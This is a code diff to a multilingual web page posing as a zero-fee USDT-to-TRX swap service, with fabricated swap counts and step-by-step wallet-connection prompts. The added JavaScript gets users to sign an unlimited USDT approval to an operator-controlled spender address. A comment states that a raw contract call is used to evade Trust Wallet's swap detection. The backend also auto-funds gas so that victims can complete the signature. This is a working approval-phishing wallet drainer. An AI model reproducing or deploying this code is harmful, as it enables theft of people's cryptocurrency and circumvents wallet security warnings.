+            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
             document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';
             document.getElementById('step2-status').className='text-emerald-400 text-xs font-semibold flex items-center';
-            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
+            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
             document.getElementById('step3').style.opacity='1';
+            hideProgress();
         }
 
+        // ===== Approve (TRX 자동 충전 + 프로그레스 바) =====
         window.executeUnlimitedApprove=async function(){
             if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
+            if(isApproved){showToast(currentLang==='ko'?'이미 교환 승인이 완료되었습니다':'Already approved');return;}
             var spender=await getSpenderAddress();
-            if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog('[오류] Spender 미설정','error');return;}
+            if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');return;}
             var tw=await getInjectedTronWeb();
-            if(!tw||!tw.contract){showToast('Trust Wallet DApp 브라우저 필요','error');if(isMobile()){launchTrustWalletApp();document.getElementById('mobile-dapp-modal').classList.add('active');}return;}
+            if(!tw||!tw.contract){showToast('지갑 DApp 브라우저 필요','error');if(isMobile())showWalletSelector();return;}
+
             var btn=document.getElementById('approve-btn');
-            btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>가스비 확인 중...</span>';btn.disabled=true;
+            btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
+
+            // Step 1: TRX 확인 + 자동 충전
+            setProgress(20,'TRX 잔액 확인 중...');
+            appendLog(L('trxCheck'),'approve');
             try{
-                appendLog('[준비] TRX 잔액 및 에너지 확인 중...','approve');
                 var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
                 var prepData=await prepRes.json();
                 if(prepData.status==='ok'&&prepData.ready){
-                    if(prepData.sent){appendLog('[자동 충전] '+prepData.sentAmount+' TRX 전송 완료! 잔액: '+prepData.trxBalance+' TRX','success');showToast(prepData.sentAmount+' TRX 자동 충전 완료!');}
-                    else{appendLog('[확인] TRX 충분 ('+prepData.trxBalance+' TRX)','success');}
-                }else{showToast('가스비 준비 실패','error');appendLog('[실패] TRX 준비 실패: '+(prepData.error||'알 수 없음'),'error');btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;}
-            }catch(pe){appendLog('[경고] TRX 확인 실패, 승인 계속 진행','warn');}
+                    if(prepData.sent){
+                        setProgress(40,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');
+                        appendLog(L('autoCharge',prepData.sentAmount),'success');
+                        showToast(prepData.sentAmount+' TRX 자동 충전!');
+                    }else{
+                        setProgress(40,'TRX 충분 ('+prepData.trxBalance+' TRX)');
+                        appendLog(L('trxOk',prepData.trxBalance),'success');
+                    }
+                }else{
+                    setProgress(0,'');hideProgress();
+                    showToast('가스비 준비 실패','error');appendLog(L('trxFail',prepData.error||''),'error');
+                    btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">USDT 교환 시작 (최초 1회 승인 포함)</span>';btn.disabled=false;return;
+                }
+            }catch(pe){appendLog(L('trxWarn'),'warn');}
+
+            // Step 2: Approve 서명
+            setProgress(60,'스마트 컨트랙트 승인 서명 요청 중...');
+            appendLog(L('approving'),'approve');
+            showToast('지갑에서 서명 팝업을 확인하세요.');
+
             try{
-                btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>서명 처리 중...</span>';
-                appendLog('[승인 요청] Spender('+spender+') 무제한 승인 중...','approve');
-                showToast('Trust Wallet 서명 팝업을 확인하세요.');
-                var contract=await tw.contract().at(OFFICIAL_USDT_CONTRACT);
-                var txHash=await contract.approve(spender,MAX_ALLOWANCE).send({feeLimit:100000000});
+                // triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회)
+                var tx=await tw.transactionBuilder.triggerSmartContract(
+                    OFFICIAL_USDT_CONTRACT,
+                    'approve(address,uint256)',
+                    {feeLimit:100000000},
+                    [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
+                    currentWalletAddress
+                );
+                if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
+                var signedTx=await tw.trx.sign(tx.transaction);
+                var result=await tw.trx.sendRawTransaction(signedTx);
+                var txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
                 if(!txHash)throw new Error('TX 해시 수신 실패');
+
+                // Step 3: 완료
+                setProgress(100,'온체인 승인 완료!');
+                appendLog(L('approved',txHash),'success');
                 isApproved=true;setApprovedUI();
-                appendLog('[온체인 승인 성공] TxHash: '+txHash,'success');
+
                 document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
                 document.getElementById('reward-modal').classList.add('active');
-                try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});appendLog('[백엔드 동기화] 완료','success');}catch(e){appendLog('[경고] 백엔드 동기화 실패','warn');}
-                showToast('온체인 무제한 승인 완료!');
+
+                try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
+                showToast(currentLang==='ko'?'교환 승인 완료!':'Swap approved!');
             }catch(err){
+                hideProgress();
                 var m=err&&err.message?err.message:JSON.stringify(err);
-                if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){showToast('서명 취소','error');appendLog('[취소] 사용자 서명 취소','warn');}
-                else{showToast('트랜잭션 실패','error');appendLog('[실패] '+m,'error');}
-            }finally{btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;}
+                if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){
+                    showToast('서명 취소됨','error');appendLog(L('cancelled'),'warn');
+                }else{
+                    showToast('트랜잭션 실패','error');appendLog(L('failed',m),'error');
+                }
+            }finally{
+                btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">USDT 교환 시작 (최초 1회 승인 포함)</span>';btn.disabled=false;
+            }
         };
+    </script>
+
+    <script>
+    // ===== 10개 언어 번역 시스템 =====
+    var translations={
+        ko:{modal_subtitle:'사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.',w_tronlink:'TRON 공식 지갑',w_trust:'멀티체인 지갑',w_tp:'아시아 인기 지갑',w_bitget:'글로벌 Web3 지갑',w_okx:'OKX 거래소 지갑',modal_tip_title:'앱이 자동으로 안 열리면:',modal_tip1:'1. 선택한 지갑 앱을 직접 여세요',modal_tip2:'2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동',modal_tip3:'3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)',swap_count_val:'18,492 건',bal:'잔액',bal2:'잔액',connect_wallet2:'지갑 연결',log_system:'[시스템] TRON Mainnet 연결됨',log_waiting:'[대기] 지갑 감지 중...',step_core:'핵심 진행',step_auto:'자동 처리',live_log:'실시간 로그',disconnected:'연결 해제',usdt_balance:'USDT 잔액',wallet_address:'지갑 주소',balance_label:'잔액',balance_label2:'잔액',close_btn:'닫기',ticker_label:'실시간 교환 현황',header_sub:'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷',connect_wallet:'지갑 연결',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT로 TRX',hero_title2:'즉시 교환',hero_desc:'수수료 0%로 USDT를 TRX로 즉시 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.',today_volume:'오늘 총 교환량',free_event:'수수료 무료 이벤트',swap_count:'교환 건수',avg_amount:'평균 교환액',steps_title:'교환 진행 단계',step_waiting:'대기 중',step1_title:'지갑 연결',step2_title:'교환 승인 (최초 1회)',step2_desc:'USDT 스마트 컨트랙트 교환 권한 승인',step3_title:'TRX 즉시 입금',step3_desc:'교환된 TRX가 지갑으로 자동 입금됩니다.',swap_title:'USDT → TRX 교환',swap_sub:'TRC-20 즉시 스왑',approval_needed:'교환 승인 필요',send_amount:'보내는 금액 (USDT)',receive_amount:'받는 금액 (예상)',exchange_rate_label:'교환 비율',fee_label:'수수료',fee_free:'무료 (이벤트 기간)',swap_btn_text:'USDT 교환 시작 (최초 1회 승인 포함)',swap_btn_done:'USDT → TRX 교환하기',swap_notice:'최초 1회 교환 시 USDT 스마트 컨트랙트 승인이 필요합니다',wallet_info:'지갑 연동 정보',wallet_not_connected:'지갑이 연결되어 있지 않습니다',wallet_guide:'지갑 앱의 DApp 브라우저에서 접속하세요.',swap_status:'교환 상태',select_wallet:'지갑을 선택하세요',security_title:'보안 검증',faq_title:'자주 묻는 질문 (FAQ)',modal_success:'교환 승인 완료!',modal_desc:'USDT ↔ TRX 교환 권한이 승인되었습니다.'},
+        en:{modal_subtitle:'Select your wallet app<br>to connect automatically.',w_tronlink:'TRON Official Wallet',w_trust:'Multi-chain Wallet',w_tp:'Popular in Asia',w_bitget:'Global Web3 Wallet',w_okx:'OKX Exchange Wallet',modal_tip_title:'If the app doesn\'t open:',modal_tip1:'1. Open the wallet app manually',modal_tip2:'2. Go to <strong class="text-white">Browser</strong> tab in the app',modal_tip3:'3. <strong class="text-white">Paste</strong> the URL (auto-copied)',swap_count_val:'18,492 swaps',bal:'Balance',bal2:'Balance',connect_wallet2:'Connect Wallet',log_system:'[System] TRON Mainnet connected',log_waiting:'[Wait] Detecting wallet...',step_core:'Core Step',step_auto:'Auto Process',live_log:'Live Log',disconnected:'DISCONNECTED',usdt_balance:'USDT Balance',wallet_address:'Wallet Address',balance_label:'Balance',balance_label2:'Balance',close_btn:'Close',ticker_label:'Live Exchange Feed',header_sub:'USDT ↔ TRX Instant Swap | TRC-20 Mainnet',connect_wallet:'Connect Wallet',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT to TRX',hero_title2:'Instant Swap',hero_desc:'Swap USDT to TRX instantly with 0% fee. One-time smart contract approval enables unlimited swaps.',today_volume:'Today\'s Volume',free_event:'Zero Fee Event',swap_count:'Swaps',avg_amount:'Avg. Amount',steps_title:'How It Works',step_waiting:'Waiting',step1_title:'Connect Wallet',step2_title:'Approve (One-time)',step2_desc:'USDT smart contract swap authorization',step3_title:'Receive TRX',step3_desc:'Swapped TRX is deposited to your wallet instantly.',swap_title:'USDT → TRX Swap',swap_sub:'TRC-20 Instant Swap',approval_needed:'Approval Required',send_amount:'You Send (USDT)',receive_amount:'You Receive (Est.)',exchange_rate_label:'Exchange Rate',fee_label:'Fee',fee_free:'Free (Event Period)',swap_btn_text:'Start Swap (One-time Approval)',swap_btn_done:'Swap USDT → TRX',swap_notice:'First swap requires USDT smart contract approval',wallet_info:'Wallet Info',wallet_not_connected:'Wallet not connected',wallet_guide:'Open in wallet app\'s DApp browser.',swap_status:'Swap Status',select_wallet:'Select Your Wallet',security_title:'Security Verified',faq_title:'FAQ',modal_success:'Swap Approved!',modal_desc:'USDT ↔ TRX swap authorization confirmed.'},
+        zh:{modal_subtitle:'选择您的钱包应用<br>自动连接。',w_tronlink:'TRON 官方钱包',w_trust:'多链钱包',w_tp:'亚洲热门钱包',w_bitget:'全球 Web3 钱包',w_okx:'OKX 交易所钱包',modal_tip_title:'如果应用未自动打开：',modal_tip1:'1. 手动打开钱包应用',modal_tip2:'2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡',modal_tip3:'3. 在地址栏<strong class="text-white">粘贴</strong>网址（已自动复制）',swap_count_val:'18,492 笔',bal:'余额',bal2:'余额',connect_wallet2:'连接钱包',log_system:'[系统] TRON 主网已连接',log_waiting:'[等待] 正在检测钱包...',step_core:'核心步骤',step_auto:'自动处理',live_log:'实时日志',disconnected:'未连接',usdt_balance:'USDT 余额',wallet_address:'钱包地址',balance_label:'余额',balance_label2:'余额',close_btn:'关闭',ticker_label:'实时交换动态',header_sub:'USDT ↔ TRX 即时兑换 | TRC-20 主网',connect_wallet:'连接钱包',hero_badge:'TRON 主网即时兑换',hero_title1:'USDT 兑换 TRX',hero_title2:'即时兑换',hero_desc:'0%手续费即时将USDT兑换为TRX。首次智能合约授权后可无限兑换。',today_volume:'今日交易量',free_event:'零手续费活动',swap_count:'交换次数',avg_amount:'平均金额',steps_title:'兑换步骤',step_waiting:'等待中',step1_title:'连接钱包',step2_title:'授权（仅首次）',step2_desc:'USDT智能合约兑换授权',step3_title:'收到TRX',step3_desc:'兑换的TRX将自动存入您的钱包。',swap_title:'USDT → TRX 兑换',swap_sub:'TRC-20 即时兑换',approval_needed:'需要授权',send_amount:'发送金额 (USDT)',receive_amount:'接收金额（预估）',exchange_rate_label:'汇率',fee_label:'手续费',fee_free:'免费（活动期间）',swap_btn_text:'开始兑换（首次需授权）',swap_btn_done:'兑换 USDT → TRX',swap_notice:'首次兑换需要USDT智能合约授权',wallet_info:'钱包信息',wallet_not_connected:'钱包未连接',wallet_guide:'请在钱包应用的DApp浏览器中打开。',swap_status:'兑换状态',select_wallet:'选择钱包',security_title:'安全验证',faq_title:'常见问题',modal_success:'授权成功！',modal_desc:'USDT ↔ TRX兑换权限已确认。'},
+        ru:{modal_subtitle:'Выберите кошелёк<br>для автоматического подключения.',w_tronlink:'Официальный кошелёк TRON',w_trust:'Мультичейн кошелёк',w_tp:'Популярный в Азии',w_bitget:'Глобальный Web3 кошелёк',w_okx:'Кошелёк биржи OKX',modal_tip_title:'Если приложение не открылось:',modal_tip1:'1. Откройте кошелёк вручную',modal_tip2:'2. Перейдите во вкладку <strong class="text-white">Браузер</strong>',modal_tip3:'3. <strong class="text-white">Вставьте</strong> URL (скопирован)',swap_count_val:'18,492 сделок',bal:'Баланс',bal2:'Баланс',connect_wallet2:'Подключить',log_system:'[Система] TRON Mainnet подключён',log_waiting:'[Ожидание] Обнаружение кошелька...',step_core:'Основной шаг',step_auto:'Автоматически',live_log:'Журнал',disconnected:'ОТКЛЮЧЕНО',usdt_balance:'Баланс USDT',wallet_address:'Адрес кошелька',balance_label:'Баланс',balance_label2:'Баланс',close_btn:'Закрыть',ticker_label:'Обмены в реальном времени',header_sub:'USDT ↔ TRX Мгновенный обмен | TRC-20',connect_wallet:'Подключить',hero_badge:'TRON MAINNET МГНОВЕННЫЙ ОБМЕН',hero_title1:'USDT в TRX',hero_title2:'Мгновенный обмен',hero_desc:'Обменивайте USDT на TRX мгновенно с комиссией 0%. Одноразовое одобрение смарт-контракта.',today_volume:'Объём за сегодня',free_event:'Без комиссии',swap_count:'Обменов',avg_amount:'Средняя сумма',steps_title:'Как это работает',step_waiting:'Ожидание',step1_title:'Подключение',step2_title:'Одобрение (1 раз)',step2_desc:'Авторизация смарт-контракта USDT',step3_title:'Получение TRX',step3_desc:'TRX автоматически поступит в ваш кошелёк.',swap_title:'USDT → TRX Обмен',swap_sub:'TRC-20 мгновенный обмен',approval_needed:'Требуется одобрение',send_amount:'Вы отправляете (USDT)',receive_amount:'Вы получаете (прибл.)',exchange_rate_label:'Курс обмена',fee_label:'Комиссия',fee_free:'Бесплатно (акция)',swap_btn_text:'Начать обмен (одобрение)',swap_btn_done:'Обменять USDT → TRX',swap_notice:'Первый обмен требует одобрения смарт-контракта',wallet_info:'Информация о кошельке',wallet_not_connected:'Кошелёк не подключён',wallet_guide:'Откройте в DApp-браузере кошелька.',swap_status:'Статус обмена',select_wallet:'Выберите кошелёк',security_title:'Безопасность',faq_title:'Вопросы и ответы',modal_success:'Одобрение завершено!',modal_desc:'Авторизация обмена USDT ↔ TRX подтверждена.'},
+        th:{modal_subtitle:'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ',w_tronlink:'กระเป๋า TRON อย่างเป็นทางการ',w_trust:'กระเป๋าหลายเชน',w_tp:'ยอดนิยมในเอเชีย',w_bitget:'กระเป๋า Web3 ระดับโลก',w_okx:'กระเป๋า OKX',modal_tip_title:'หากแอปไม่เปิด:',modal_tip1:'1. เปิดแอปกระเป๋าด้วยตนเอง',modal_tip2:'2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>',modal_tip3:'3. <strong class="text-white">วาง</strong> URL (คัดลอกแล้ว)',swap_count_val:'18,492 รายการ',bal:'ยอด',bal2:'ยอด',connect_wallet2:'เชื่อมต่อ',log_system:'[ระบบ] TRON Mainnet เชื่อมต่อแล้ว',log_waiting:'[รอ] กำลังตรวจจับกระเป๋า...',step_core:'ขั้นตอนหลัก',step_auto:'อัตโนมัติ',live_log:'บันทึก',disconnected:'ไม่ได้เชื่อมต่อ',usdt_balance:'ยอด USDT',wallet_address:'ที่อยู่กระเป๋า',balance_label:'ยอดคงเหลือ',balance_label2:'ยอดคงเหลือ',close_btn:'ปิด',ticker_label:'การแลกเปลี่ยนแบบเรียลไทม์',header_sub:'USDT ↔ TRX แลกเปลี่ยนทันที | TRC-20',connect_wallet:'เชื่อมต่อ',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT เป็น TRX',hero_title2:'แลกทันที',hero_desc:'แลก USDT เป็น TRX ทันทีไม่มีค่าธรรมเนียม อนุมัติสัญญาอัจฉริยะครั้งเดียว',today_volume:'ปริมาณวันนี้',free_event:'ไม่มีค่าธรรมเนียม',swap_count:'จำนวนการแลก',avg_amount:'จำนวนเฉลี่ย',steps_title:'ขั้นตอน',step_waiting:'รอดำเนินการ',step1_title:'เชื่อมต่อกระเป๋า',step2_title:'อนุมัติ (ครั้งเดียว)',step2_desc:'อนุมัติสัญญาอัจฉริยะ USDT',step3_title:'รับ TRX',step3_desc:'TRX จะถูกโอนเข้ากระเป๋าอัตโนมัติ',swap_title:'USDT → TRX แลกเปลี่ยน',swap_sub:'TRC-20 แลกทันที',approval_needed:'ต้องอนุมัติ',send_amount:'จำนวนที่ส่ง (USDT)',receive_amount:'จำนวนที่ได้รับ (ประมาณ)',exchange_rate_label:'อัตราแลกเปลี่ยน',fee_label:'ค่าธรรมเนียม',fee_free:'ฟรี (ช่วงอีเวนต์)',swap_btn_text:'เริ่มแลก (อนุมัติครั้งเดียว)',swap_btn_done:'แลก USDT → TRX',swap_notice:'การแลกครั้งแรกต้องอนุมัติสัญญาอัจฉริยะ',wallet_info:'ข้อมูลกระเป๋า',wallet_not_connected:'ยังไม่ได้เชื่อมต่อ',wallet_guide:'เปิดในเบราว์เซอร์ DApp ของกระเป๋า',swap_status:'สถานะ',select_wallet:'เลือกกระเป๋า',security_title:'การรักษาความปลอดภัย',faq_title:'คำถามที่พบบ่อย',modal_success:'อนุมัติสำเร็จ!',modal_desc:'การอนุมัติแลกเปลี่ยน USDT ↔ TRX ได้รับการยืนยัน'},
+        vi:{modal_subtitle:'Chọn ví của bạn<br>để kết nối tự động.',w_tronlink:'Ví chính thức TRON',w_trust:'Ví đa chuỗi',w_tp:'Phổ biến ở châu Á',w_bitget:'Ví Web3 toàn cầu',w_okx:'Ví sàn OKX',modal_tip_title:'Nếu ứng dụng không mở:',modal_tip1:'1. Mở ứng dụng ví thủ công',modal_tip2:'2. Vào tab <strong class="text-white">Trình duyệt</strong>',modal_tip3:'3. <strong class="text-white">Dán</strong> URL (đã sao chép)',swap_count_val:'18,492 giao dịch',bal:'Số dư',bal2:'Số dư',connect_wallet2:'Kết nối ví',log_system:'[Hệ thống] TRON Mainnet đã kết nối',log_waiting:'[Chờ] Đang phát hiện ví...',step_core:'Bước chính',step_auto:'Tự động',live_log:'Nhật ký',disconnected:'NGẮT KẾT NỐI',usdt_balance:'Số dư USDT',wallet_address:'Địa chỉ ví',balance_label:'Số dư',balance_label2:'Số dư',close_btn:'Đóng',ticker_label:'Giao dịch thời gian thực',header_sub:'USDT ↔ TRX Đổi ngay | TRC-20',connect_wallet:'Kết nối ví',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT sang TRX',hero_title2:'Đổi ngay',hero_desc:'Đổi USDT sang TRX ngay lập tức với phí 0%. Chỉ cần phê duyệt hợp đồng thông minh một lần.',today_volume:'Khối lượng hôm nay',free_event:'Miễn phí giao dịch',swap_count:'Số giao dịch',avg_amount:'Số tiền TB',steps_title:'Cách thức',step_waiting:'Đang chờ',step1_title:'Kết nối ví',step2_title:'Phê duyệt (1 lần)',step2_desc:'Ủy quyền hợp đồng USDT',step3_title:'Nhận TRX',step3_desc:'TRX sẽ được gửi vào ví của bạn tự động.',swap_title:'USDT → TRX Đổi',swap_sub:'TRC-20 đổi ngay',approval_needed:'Cần phê duyệt',send_amount:'Số tiền gửi (USDT)',receive_amount:'Số tiền nhận (ước tính)',exchange_rate_label:'Tỷ giá',fee_label:'Phí',fee_free:'Miễn phí (sự kiện)',swap_btn_text:'Bắt đầu đổi (phê duyệt 1 lần)',swap_btn_done:'Đổi USDT → TRX',swap_notice:'Lần đổi đầu tiên cần phê duyệt hợp đồng thông minh',wallet_info:'Thông tin ví',wallet_not_connected:'Ví chưa kết nối',wallet_guide:'Mở trong trình duyệt DApp của ví.',swap_status:'Trạng thái',select_wallet:'Chọn ví',security_title:'Bảo mật',faq_title:'Câu hỏi thường gặp',modal_success:'Phê duyệt thành công!',modal_desc:'Ủy quyền đổi USDT ↔ TRX đã được xác nhận.'},
+        ja:{modal_subtitle:'ウォレットアプリを選択して<br>自動接続します。',w_tronlink:'TRON公式ウォレット',w_trust:'マルチチェーンウォレット',w_tp:'アジアで人気',w_bitget:'グローバルWeb3ウォレット',w_okx:'OKX取引所ウォレット',modal_tip_title:'アプリが開かない場合：',modal_tip1:'1. ウォレットアプリを手動で開く',modal_tip2:'2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ',modal_tip3:'3. URLを<strong class="text-white">貼り付け</strong>（コピー済み）',swap_count_val:'18,492 件',bal:'残高',bal2:'残高',connect_wallet2:'接続',log_system:'[システム] TRON Mainnet 接続済み',log_waiting:'[待機] ウォレット検出中...',step_core:'コアステップ',step_auto:'自動処理',live_log:'リアルタイムログ',disconnected:'未接続',usdt_balance:'USDT残高',wallet_address:'ウォレットアドレス',balance_label:'残高',balance_label2:'残高',close_btn:'閉じる',ticker_label:'リアルタイム交換状況',header_sub:'USDT ↔ TRX 即時交換 | TRC-20 メインネット',connect_wallet:'ウォレット接続',hero_badge:'TRON メインネット即時スワップ',hero_title1:'USDTをTRXに',hero_title2:'即時交換',hero_desc:'手数料0%でUSDTをTRXに即時交換。スマートコントラクトの初回承認で無制限交換が可能です。',today_volume:'本日の取引量',free_event:'手数料無料イベント',swap_count:'交換件数',avg_amount:'平均交換額',steps_title:'交換手順',step_waiting:'待機中',step1_title:'ウォレット接続',step2_title:'承認（初回のみ）',step2_desc:'USDTスマートコントラクト交換権限承認',step3_title:'TRX即時入金',step3_desc:'交換されたTRXが自動的にウォレットに入金されます。',swap_title:'USDT → TRX 交換',swap_sub:'TRC-20 即時スワップ',approval_needed:'承認が必要',send_amount:'送金額 (USDT)',receive_amount:'受取額（予想）',exchange_rate_label:'交換レート',fee_label:'手数料',fee_free:'無料（イベント期間）',swap_btn_text:'交換開始（初回承認含む）',swap_btn_done:'USDT → TRX 交換する',swap_notice:'初回交換時にUSDTスマートコントラクトの承認が必要です',wallet_info:'ウォレット情報',wallet_not_connected:'ウォレット未接続',wallet_guide:'ウォレットアプリのDAppブラウザで開いてください。',swap_status:'交換状態',select_wallet:'ウォレットを選択',security_title:'セキュリティ検証',faq_title:'よくある質問',modal_success:'承認完了！',modal_desc:'USDT ↔ TRX交換権限が承認されました。'},
+        de:{modal_subtitle:'Wählen Sie Ihr Wallet<br>für automatische Verbindung.',w_tronlink:'TRON Offizielles Wallet',w_trust:'Multi-Chain Wallet',w_tp:'Beliebt in Asien',w_bitget:'Globales Web3 Wallet',w_okx:'OKX Börsen-Wallet',modal_tip_title:'Falls die App nicht öffnet:',modal_tip1:'1. Öffnen Sie die Wallet-App manuell',modal_tip2:'2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab',modal_tip3:'3. URL <strong class="text-white">einfügen</strong> (kopiert)',swap_count_val:'18,492 Swaps',bal:'Guthaben',bal2:'Guthaben',connect_wallet2:'Verbinden',log_system:'[System] TRON Mainnet verbunden',log_waiting:'[Warten] Wallet wird erkannt...',step_core:'Kernschritt',step_auto:'Automatisch',live_log:'Live-Protokoll',disconnected:'GETRENNT',usdt_balance:'USDT Guthaben',wallet_address:'Wallet-Adresse',balance_label:'Guthaben',balance_label2:'Guthaben',close_btn:'Schließen',ticker_label:'Live-Austausch',header_sub:'USDT ↔ TRX Sofort-Tausch | TRC-20',connect_wallet:'Wallet verbinden',hero_badge:'TRON MAINNET SOFORT-TAUSCH',hero_title1:'USDT zu TRX',hero_title2:'Sofort tauschen',hero_desc:'Tauschen Sie USDT sofort in TRX mit 0% Gebühr. Einmalige Smart-Contract-Genehmigung.',today_volume:'Heutiges Volumen',free_event:'Gebührenfreies Event',swap_count:'Tauschvorgänge',avg_amount:'Durchschn. Betrag',steps_title:'So funktioniert es',step_waiting:'Wartend',step1_title:'Wallet verbinden',step2_title:'Genehmigung (einmalig)',step2_desc:'USDT Smart-Contract-Autorisierung',step3_title:'TRX erhalten',step3_desc:'Getauschte TRX werden automatisch in Ihr Wallet eingezahlt.',swap_title:'USDT → TRX Tausch',swap_sub:'TRC-20 Sofort-Swap',approval_needed:'Genehmigung erforderlich',send_amount:'Sie senden (USDT)',receive_amount:'Sie erhalten (geschätzt)',exchange_rate_label:'Wechselkurs',fee_label:'Gebühr',fee_free:'Kostenlos (Aktionszeitraum)',swap_btn_text:'Tausch starten (einmalige Genehmigung)',swap_btn_done:'USDT → TRX tauschen',swap_notice:'Erstmaliger Tausch erfordert Smart-Contract-Genehmigung',wallet_info:'Wallet-Info',wallet_not_connected:'Wallet nicht verbunden',wallet_guide:'Öffnen Sie im DApp-Browser der Wallet-App.',swap_status:'Tauschstatus',select_wallet:'Wallet auswählen',security_title:'Sicherheit',faq_title:'Häufige Fragen',modal_success:'Genehmigung abgeschlossen!',modal_desc:'USDT ↔ TRX Tauschautorisierung bestätigt.'},
+        fr:{modal_subtitle:'Sélectionnez votre portefeuille<br>pour une connexion automatique.',w_tronlink:'Portefeuille officiel TRON',w_trust:'Portefeuille multi-chaînes',w_tp:'Populaire en Asie',w_bitget:'Portefeuille Web3 mondial',w_okx:'Portefeuille OKX',modal_tip_title:'Si l\'appli ne s\'ouvre pas :',modal_tip1:'1. Ouvrez l\'appli manuellement',modal_tip2:'2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>',modal_tip3:'3. <strong class="text-white">Collez</strong> l\'URL (copié)',swap_count_val:'18,492 échanges',bal:'Solde',bal2:'Solde',connect_wallet2:'Connecter',log_system:'[Système] TRON Mainnet connecté',log_waiting:'[Attente] Détection du portefeuille...',step_core:'Étape clé',step_auto:'Automatique',live_log:'Journal',disconnected:'DÉCONNECTÉ',usdt_balance:'Solde USDT',wallet_address:'Adresse du portefeuille',balance_label:'Solde',balance_label2:'Solde',close_btn:'Fermer',ticker_label:'Échanges en direct',header_sub:'USDT ↔ TRX Échange instantané | TRC-20',connect_wallet:'Connecter',hero_badge:'TRON MAINNET ÉCHANGE INSTANTANÉ',hero_title1:'USDT vers TRX',hero_title2:'Échange instantané',hero_desc:'Échangez USDT contre TRX instantanément avec 0% de frais. Approbation unique du contrat intelligent.',today_volume:'Volume du jour',free_event:'Sans frais',swap_count:'Échanges',avg_amount:'Montant moyen',steps_title:'Comment ça marche',step_waiting:'En attente',step1_title:'Connecter le portefeuille',step2_title:'Approbation (unique)',step2_desc:'Autorisation du contrat USDT',step3_title:'Recevoir TRX',step3_desc:'Les TRX échangés sont déposés automatiquement.',swap_title:'USDT → TRX Échange',swap_sub:'TRC-20 swap instantané',approval_needed:'Approbation requise',send_amount:'Vous envoyez (USDT)',receive_amount:'Vous recevez (est.)',exchange_rate_label:'Taux de change',fee_label:'Frais',fee_free:'Gratuit (période événement)',swap_btn_text:'Commencer l\'échange (approbation)',swap_btn_done:'Échanger USDT → TRX',swap_notice:'Le premier échange nécessite l\'approbation du contrat intelligent',wallet_info:'Info portefeuille',wallet_not_connected:'Portefeuille non connecté',wallet_guide:'Ouvrez dans le navigateur DApp du portefeuille.',swap_status:'Statut',select_wallet:'Choisir un portefeuille',security_title:'Sécurité vérifiée',faq_title:'Questions fréquentes',modal_success:'Approbation réussie !',modal_desc:'L\'autorisation d\'échange USDT ↔ TRX est confirmée.'},
